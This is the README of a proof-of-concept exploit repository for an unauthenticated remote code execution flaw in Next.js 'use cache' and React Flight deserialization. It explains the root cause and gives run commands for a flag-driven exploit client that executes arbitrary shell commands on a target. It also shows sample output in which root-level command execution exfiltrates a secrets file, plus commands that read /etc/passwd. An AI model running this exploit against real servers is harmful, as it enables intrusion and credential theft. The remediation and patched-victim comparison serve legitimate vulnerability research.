# GHSA-673q-mjm6-r5xr — Remote RCE PoC (Next.js `use cache` / React Flight)

> **Unauthenticated Remote Code Execution in `use cache` functions returning typed arrays**
> Next.js `>=16.0.0 <16.4.1` · CVSS v4 **9.5 Critical** · CWE-502 (Deserialization of Untrusted Data)
> Upstream root cause: React Server Components — **CVE-2026-126187 / GHSA-xqc2-xf4c-x3h3**
> (`react-server-dom-*` `< 19.2.9` / `19.1.10` / `19.0.9` / `19.3.1`). Fixed in Next.js **16.4.1**.

A fully working, Dockerized, **remote** proof of concept: a network attacker sends **one
unauthenticated HTTP request** and executes arbitrary commands as `root` inside the victim
container. A patched victim built from the same sources is immune.

```
 attacker container  ──HTTP POST /profile (crafted body)──▶  victim container (Next.js-style
   (no privileged access)                                     `use cache` Flight boundary)
          ▲                                                           │
          └──────────── GET /proof  ◀── server-side `id`, SECRET.txt exfil ──┘
```

This is a self-contained reproduction of the exact React Server Components Flight transport that
Next.js vendors (`react-server-dom-webpack`), pinned to the vulnerable (`19.2.8`) and patched
(`19.2.9`) versions. See [`CASE-STUDY.md`](./CASE-STUDY.md) for the full root-cause analysis.

---

## TL;DR

```bash
make demo         # builds images, starts both victims, pwns the vulnerable one,
                  # then shows the same exploit fail against the patched one
```

or step by step:

```bash
docker compose up -d --build victim victim-patched   # :3000 vulnerable, :3001 patched
docker compose run --rm poc                     # RCE vs :3000   -> exit 0
docker compose run --rm poc-patched             # safe   vs :3001 -> exit 1
docker compose run --rm evidence                     # root-cause reproducers, side by side
```

Requirements: Docker + Docker Compose. No internet access needed at runtime (only at build time
to pull the pinned npm packages).

---

## What you'll see

Against the **vulnerable** victim (`react-server-dom-webpack@19.2.8`):

```
[+] REMOTE CODE EXECUTION CONFIRMED
    command : id; echo; echo "=== exfiltrated /app/SECRET.txt ==="; cat /app/SECRET.txt; echo; uname -a
    host    : 648b3c59052e  user: root  pid: 1
    --- command output (executed on the victim) ---
    | uid=0(root) gid=0(root) groups=0(root)
    |
    | === exfiltrated /app/SECRET.txt ===
    | DB_PASSWORD=hunter2
    | API_KEY=sk-live-7f3c9a21b0e4
    | FLAG{GHSA-673q-mjm6-r5xr-rce}
    |
    | Linux 648b3c59052e 6.10.14-linuxkit ... aarch64 GNU/Linux
```

Against the **patched** victim (`react-server-dom-webpack@19.2.9`) the identical request decodes
to a harmless profile card — the attacker's bytes stay inside the `displayName` string and never
become protocol instructions:

```
[-] No code execution observed. Target is PATCHED.
    decode result: {"keys":["avatar","thumbnail","displayName"],"displayName":"PPPP…"}
```

---

## The vulnerable pattern

The victim caches a user "profile card" with a Next.js-style `use cache` function. The cached
value bundles **two typed arrays that are views onto the same `ArrayBuffer`** (an `avatar` and a
`thumbnail` sliced from one decoded image — a very common "decode once, slice regions" pattern)
**plus an attacker-controlled string** (the display name from the request):

```js
function getProfileCard(displayName) {
  'use cache'
  const decodedImage = new ArrayBuffer(8192 * 2)         // one decoded image
  const avatar    = new Uint8Array(decodedImage, 0, 8192)      // view 1
  const thumbnail = new Uint8Array(decodedImage, 8192, 8192)   // view 2 — SAME buffer
  return { avatar, thumbnail, displayName }                    // displayName = attacker input
}
```

When React's Flight encoder streams the first large typed array into a byte `ReadableStream`, the
shared `ArrayBuffer` is **detached** (WHATWG Streams transfer semantics). The second view's
`byteLength` silently becomes `0` — *after* its chunk header already declared the original length.
The decoder then over-reads, swallowing stream framing and letting the attacker's `displayName`
bytes be parsed as **raw Flight protocol rows**, which inject a Server Reference the attacker
chose. React invokes it during the cache read → RCE. Full analysis in
[`CASE-STUDY.md`](./CASE-STUDY.md).

---

## Layout

```
.
├── README.md                 you are here
├── CASE-STUDY.md             full root-cause + exploitation write-up
├── docker-compose.yml        victim (vuln), victim-patched, poc, evidence
├── Makefile                  make demo / up / exploit / evidence / clean
├── victim/
│   ├── Dockerfile            ARG RSDW_VERSION selects 19.2.8 (vuln) or 19.2.9 (patched)
│   ├── server.js             faithful Next.js `use cache` encode→store→decode pipeline
│   └── app-modules.js        the server module graph the injected reference resolves against
├── poc/
│   ├── Dockerfile
│   └── exploit.js            remote HTTP exploit (flag-driven; see -h; self-aligning payload)
└── evidence/
    ├── 01-encoder-desync.cjs       header declares N bytes, writes 0
    ├── 02-type-confusion-sink.cjs  thenable whose .then is a server reference
    ├── 03-full-chain-rce.cjs       desync → injection → command execution
    ├── run.sh                      runs all three against vuln AND patched
    ├── sample-run.txt              captured output
    └── upstream-diffs/             the real Next.js 16.4.0 → 16.4.1 patch diffs
```

---

## Manual testing

The `poc` client is flag-driven. See its full manual:

```bash
docker compose run --rm poc -h          # or:  node poc/exploit.js -h
```

```
USAGE
  node exploit.js [options]

OPTIONS
  -t, --target <url>     Base URL of the victim           (default: http://localhost:3000)
  -c, --cmd <command>    Shell command to run on the victim
      --timeout <ms>     Per-request timeout in ms         (default: 15000)
      --dry-run          Build and print the payload; do not send anything
  -h, --help             Show this help and exit
      --version          Print version and exit
```

Examples:

```bash
# run your own command against the vulnerable victim:
docker compose run --rm poc -t http://victim:3000 -c 'cat /etc/passwd | head -3'

# inspect the crafted payload without sending it:
docker compose run --rm poc --dry-run

# drive it directly (outside compose) against a mapped port:
node poc/exploit.js -t http://localhost:3000 -c 'id'

# a normal-looking (short) request — the shared-buffer shape alone corrupts the cache entry:
curl -s -XPOST --data 'Ada Lovelace' http://localhost:3000/profile

# inspect what the victim recorded after an exploit:
curl -s http://localhost:3000/proof | jq
```

---

## Remediation

Upgrade **Next.js to ≥ 16.4.1** (which bundles the fixed React Flight runtime). If you depend on
`react-server-dom-webpack` / `-turbopack` / `-parcel` directly, upgrade to `19.2.9`, `19.1.10`,
`19.0.9`, or `19.3.1`. There is **no application-level workaround** for an affected `use cache`
function — upgrade is the only fix.

## Responsible use

This PoC targets only the two throwaway containers it builds. Use it against systems you own or are
explicitly authorized to test.
